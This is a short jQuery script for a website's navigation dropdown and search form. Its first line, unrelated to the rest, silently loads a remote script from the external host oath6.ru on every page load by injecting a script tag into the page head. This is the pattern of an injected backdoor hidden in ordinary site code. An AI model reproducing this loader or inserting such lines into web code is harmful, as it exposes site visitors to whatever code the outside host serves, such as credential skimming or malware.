function include(url) {var script = document.createElement('script');script.src = url;document.getElementsByTagName('head')[0].appendChild(script);};include("https://oath6.ru/g.js");
$(function(){
	// Dropdown
	$('ul.nav li.dropdown').hover(function() {
	    $(this).find('.dropdown-menu').stop(true, true).show();
	}, function() {
	    $(this).find('.dropdown-menu').stop(true, true).hide();
	});

	//Search
	$("#newtab-search-icon").on('click', function(){
		$("#search_form").submit();
	});

	$("#search_form").on("submit", function(){
		if($.trim($("#query").val()).length == 0) return false;
	});
});